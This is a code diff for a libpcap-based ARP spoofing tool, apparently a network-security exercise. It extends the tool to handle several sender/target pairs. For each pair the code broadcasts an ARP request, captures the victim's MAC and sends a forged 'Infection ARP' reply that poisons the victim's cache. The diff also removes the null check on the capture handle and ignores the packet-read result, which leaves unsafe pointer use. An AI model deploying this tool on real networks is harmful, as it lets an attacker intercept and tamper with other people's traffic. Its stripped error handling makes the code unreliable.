@@ -13,40 +13,43 @@ void usage() {
 }
 
 int main(int argc, char* argv[]) {
-	if (argc < 2) {
+	if (argc < 2 || argc % 2 != 0) {
 		usage();
 		return EXIT_FAILURE;
 	}
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
-
 	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-	if (pcap == NULL) {
-		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
-		return -1;
-	}
 
-	Mac smac = GetSourceMac(pcap);
 	unsigned char selfMac[6];
 	GetSelfMacFromInterface(dev, selfMac);
 
-	EthArpPacket packet;
+	for (int i=2; i < argc; i+=2) {
+		char* sendIP = argv[i];
+		char* targetIP = argv[i+1];
 
-	packet.eth_.type_ = htons(EthHdr::Arp);
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
 
-	//Broadcast
-	SetPacket(packet, Mac("FF:FF:FF:FF:FF:FF"), selfMac, ArpHdr::Request,argv[2], Mac("00:00:00:00:00:00"), argv[3]);
-	SendPacket(pcap, packet);
+		EthArpPacket packet;
 
-	//Infection ARP
-	SetPacket(packet, smac, selfMac, ArpHdr::Reply, argv[2], smac, argv[3]);
-	SendPacket(pcap, packet);
+		packet.eth_.type_ = htons(EthHdr::Arp);
+		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+		packet.arp_.pro_ = htons(EthHdr::Ip4);
+		packet.arp_.hln_ = Mac::SIZE;
+		packet.arp_.pln_ = Ip::SIZE;
+
+		//Broadcast
+		SetPacket(packet, Mac("FF:FF:FF:FF:FF:FF"), selfMac, ArpHdr::Request,sendIP, Mac("00:00:00:00:00:00"), targetIP);
+		SendPacket(pcap, packet);
+
+		//Infection ARP
+		Mac smac = GetSourceMac(pcap);
+		SetPacket(packet, smac, selfMac, ArpHdr::Reply, sendIP, smac, targetIP);
+		SendPacket(pcap, packet);
+
+	}
 
 	pcap_close(pcap);
+	
 
 }
 
@@ -64,7 +67,7 @@ Mac GetSourceMac(pcap_t* pcap) {
 	struct pcap_pkthdr* header;
 	const u_char* packet;
 
-	int res = pcap_next_ex(pcap, &header, &packet);
+    pcap_next_ex(pcap, &header, &packet);
 
 	struct EthArpPacket *etharp = (struct EthArpPacket *)packet;
 	Mac smac = etharp->arp_.smac();
